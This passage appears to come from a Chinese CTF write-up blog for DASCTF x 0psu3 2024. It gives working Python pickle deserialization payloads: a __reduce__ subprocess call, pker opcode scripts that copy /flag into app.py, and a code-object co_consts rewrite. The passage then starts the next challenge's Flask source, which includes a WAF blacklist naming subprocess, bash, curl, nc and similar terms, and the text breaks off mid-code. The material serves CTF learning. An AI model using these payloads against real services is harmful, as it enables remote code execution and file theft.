keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cp"</span><span class="token punctuation">,</span><span class="token string">"/flag"</span><span class="token punctuation">,</span><span class="token string">"/app/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   a<span class="token operator">=</span>proc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>还可以利用 builtins.open 读出 &#x2F;flag 再写入 app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./app.py'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>写pker脚本生成opcode：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">)</span><span class="token builtin">open</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>read<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./app.py'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>write<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">)</span>fff<span class="token operator">=</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fff<span class="token punctuation">)</span><span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>预期蛮有意思，也契合了这题的题目名称——const</p><h3 id="python字节码"><a href="#python字节码" class="headerlink" title="python字节码"></a>python字节码</h3><p>首先了解一下python的字节码，参考：<a href="https://developer.aliyun.com/article/1615860">https://developer.aliyun.com/article/1615860</a></p><p>PyCodeObject 的底层结构：Include&#x2F;code.h</p><pre class="line-numbers language-h" data-language="h"><code class="language-h">typedef struct &#123;    PyObject_HEAD&#x2F;&#x2F; 头部信息，我们看到真的一切皆对象，字节码也是个对象    int co_argcount;&#x2F;&#x2F; 可以通过位置参数传递的参数个数    int co_posonlyargcount;     &#x2F;&#x2F; 只能通过位置参数传递的参数个数，Python3.8新增    int co_kwonlyargcount;     &#x2F;&#x2F; 只能通过关键字参数传递的参数个数    int co_nlocals;             &#x2F;&#x2F; 代码块中局部变量的个数，也包括参数    int co_stacksize;          &#x2F;&#x2F; 执行该段代码块需要的栈空间    int co_flags;               &#x2F;&#x2F; 参数类型标识        int co_firstlineno;         &#x2F;&#x2F; 代码块在文件中的行号    PyObject *co_code;         &#x2F;&#x2F; 指令集，也就是字节码，它是一个bytes对象     PyObject *co_consts;       &#x2F;&#x2F; 常量池，一个元组，保存代码块中的所有常量    PyObject *co_names;      &#x2F;&#x2F; 一个元组，保存代码块中引用的其它作用域的变量       PyObject *co_varnames;    &#x2F;&#x2F; 一个元组，保存当前作用域中的变量    PyObject *co_freevars;      &#x2F;&#x2F; 内层函数引用的外层函数的作用域中的变量    PyObject *co_cellvars;      &#x2F;&#x2F; 外层函数的作用域中被内层函数引用的变量，本质上和co_freevars是一样的    Py_ssize_t *co_cell2arg;    PyObject *co_filename;    &#x2F;&#x2F; 代码块所在的文件名    PyObject *co_name;         &#x2F;&#x2F; 代码块的名字，通常是函数名、类名，或者文件名    PyObject *co_lnotab;        &#x2F;&#x2F; 字节码指令与python源代码的行号之间的对应关系，以PyByteObject的形式存在&#125; PyCodeObject;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python 编译器在对源代码进行编译的时候，对于代码中的每一个 block，都会创建一个 PyCodeObject 与之对应</p><p>block：当进入一个新的命名空间，或者说作用域时，就算是进入了一个新的 block</p><p>demo：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">123</span><span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码编译完后会产生三个 PyCodeObject 对象，因为这是三个不同的作用域，一个是对应整个 py 文件（模块）的，一个是对应 <code>class A</code> 的，一个是对应 <code>def foo</code> 的</p><br><p>然后是获取 PyCodeObject，首先该对象在 Python 里面的类型是 <code>&lt;class &#39;code&#39;&gt;</code>，但是底层没有将这个类暴露给我们，我们可以用<code>__code__</code>的方式获取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">)</span>  <span class="token comment"># &lt;code object ......</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># &lt;class 'code'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>既然拿到对象了就能拿到底层对应的 PyCodeObject 对象，对象种类参考上面的数据结构</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>oCode <span class="token operator">=</span> src<span class="token punctuation">.</span>__code__<span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_argcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_posonlyargcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_flags<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_names<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_varnames<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_filename<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_freevars<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_cellvars<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出之后发现一些有趣的部分</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250113224313652.png" alt="image-20250113224313652"></p><p>我们如果能够篡改这里的 co_consts 部分为 flag 即可实现读取文件</p><h3 id="创建codeObject"><a href="#创建codeObject" class="headerlink" title="创建codeObject"></a>创建codeObject</h3><p>参考：<a href="https://stackoverflow.com/questions/16064409/how-to-create-a-code-object-in-python">https://stackoverflow.com/questions/16064409/how-to-create-a-code-object-in-python</a></p><p>使用<code>types.CodeType</code>方法实现</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> types<span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>oCode <span class="token operator">=</span> src<span class="token punctuation">.</span>__code__src<span class="token punctuation">.</span>__code__ <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span>    oCode<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_posonlyargcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_names<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_cellvars<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250113225724417.png" alt="image-20250113225724417"></p><h3 id="构造pickle"><a href="#构造pickle" class="headerlink" title="构造pickle"></a>构造pickle</h3><p>最头大的一集，怎么手搓呢（</p><p>在此之前，要先把上面的<code>.</code>全部换成 getattr 的形式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">g1 <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span>g2 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">)</span>g3 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span>g4 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_posonlyargcount"</span><span class="token punctuation">)</span>g5 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_kwonlyargcount"</span><span class="token punctuation">)</span>g6 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_nlocals"</span><span class="token punctuation">)</span>g7 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_stacksize"</span><span class="token punctuation">)</span>g8 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_flags"</span><span class="token punctuation">)</span>g9 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_code"</span><span class="token punctuation">)</span>g10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># g10 = getattr(g2,"co_consts")</span>g11 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_names"</span><span class="token punctuation">)</span>g12 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_varnames"</span><span class="token punctuation">)</span>g13 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_filename"</span><span class="token punctuation">)</span>g14 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_name"</span><span class="token punctuation">)</span>g15 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_firstlineno"</span><span class="token punctuation">)</span>g16 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_lnotab"</span><span class="token punctuation">)</span>g17 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_freevars"</span><span class="token punctuation">)</span>g18 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_cellvars"</span><span class="token punctuation">)</span>g19 <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span>g3<span class="token punctuation">,</span>g4<span class="token punctuation">,</span>g5<span class="token punctuation">,</span>g6<span class="token punctuation">,</span>g7<span class="token punctuation">,</span>g8<span class="token punctuation">,</span>g9<span class="token punctuation">,</span>g10<span class="token punctuation">,</span>g11<span class="token punctuation">,</span>g12<span class="token punctuation">,</span>g13<span class="token punctuation">,</span>g14<span class="token punctuation">,</span>g15<span class="token punctuation">,</span>g16<span class="token punctuation">,</span>g17<span class="token punctuation">,</span>g18<span class="token punctuation">)</span>g20 <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">setattr</span>g20<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">,</span>g19<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用最新版的pker生成payload（2025.1.1更新支持NoneType）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">)</span><span class="token builtin">open</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span><span class="token builtin">setattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">)</span>CodeType <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'types'</span><span class="token punctuation">,</span> <span class="token string">'CodeType'</span><span class="token punctuation">)</span>src <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'src'</span><span class="token punctuation">)</span>g2 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">)</span>g3 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span><span class="token comment"># g4 = getattr(g2,"co_posonlyargcount") 因为会ban os字符串，于是用 co_argcount 代替</span>g4 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span>g5 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_kwonlyargcount"</span><span class="token punctuation">)</span>g6 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_nlocals"</span><span class="token punctuation">)</span>g7 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_stacksize"</span><span class="token punctuation">)</span>g8 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_flags"</span><span class="token punctuation">)</span>g9 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_code"</span><span class="token punctuation">)</span>g10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># g10 = getattr(g2,"co_consts")</span>g11 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_names"</span><span class="token punctuation">)</span>g12 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_varnames"</span><span class="token punctuation">)</span>g13 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_filename"</span><span class="token punctuation">)</span>g14 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_name"</span><span class="token punctuation">)</span>g15 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_firstlineno"</span><span class="token punctuation">)</span>g16 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_lnotab"</span><span class="token punctuation">)</span>g17 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_freevars"</span><span class="token punctuation">)</span>g18 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_cellvars"</span><span class="token punctuation">)</span>g19 <span class="token operator">=</span> CodeType<span class="token punctuation">(</span>g3<span class="token punctuation">,</span>g4<span class="token punctuation">,</span>g5<span class="token punctuation">,</span>g6<span class="token punctuation">,</span>g7<span class="token punctuation">,</span>g8<span class="token punctuation">,</span>g9<span class="token punctuation">,</span>g10<span class="token punctuation">,</span>g11<span class="token punctuation">,</span>g12<span class="token punctuation">,</span>g13<span class="token punctuation">,</span>g14<span class="token punctuation">,</span>g15<span class="token punctuation">,</span>g16<span class="token punctuation">,</span>g17<span class="token punctuation">,</span>g18<span class="token punctuation">)</span>g20 <span class="token operator">=</span> <span class="token builtin">setattr</span>g20<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">,</span>g19<span class="token punctuation">)</span><span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="yaml-matser（复现）"><a href="#yaml-matser（复现）" class="headerlink" title="yaml_matser（复现）"></a>yaml_matser（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> yaml<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'templates'</span><span class="token punctuation">)</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'uploads'</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist_terms <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span>                       <span class="token string">'command'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">,</span><span class="token string">'session'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span>                       <span class="token string">'run'</span><span class="token punctuation">,</span> <span class="token string">'ntimeit'</span><span class="token punctuation">,</span> <span class="token string">'bash'</span><span class="token punctuation">,</span> <span class="token string">'zsh'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'before_request'</span><span class="token punctuation">,</span> <span class="token string">'after_request'</span><span class="token punctuation">,</span>                       <span class="token string">'error_handler'</span><span class="token punctuation">,</span> <span class="token string">'add_url_rule'</span><span class="token punctuation">,</span><span class="token string">'teardown_request'</span><span class="token punctuation">,</span><span class="token string">'teardown_appcontext'</span><span class="token punctuation">,</span><span class="token string">'\\u'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">&#125;</span>    input_str_lower <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> term <span class="token keyword">in</span> blacklist_terms<span class="token punctuation">:</span>        <span class="token keyword">if</span> term <span class="token keyword">in</span> input_str_lower<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found blacklisted term: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>term<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>file_pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'.*\.yaml$'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_yaml_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>file_pattern<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    Welcome to DASCTF X 0psu3    &lt;br>    Here is the challenge &lt;a href="/upload">Upload file&lt;/a>    &lt;br>    Enjoy it &lt;a href="/Yam1">Yam1&lt;/a>    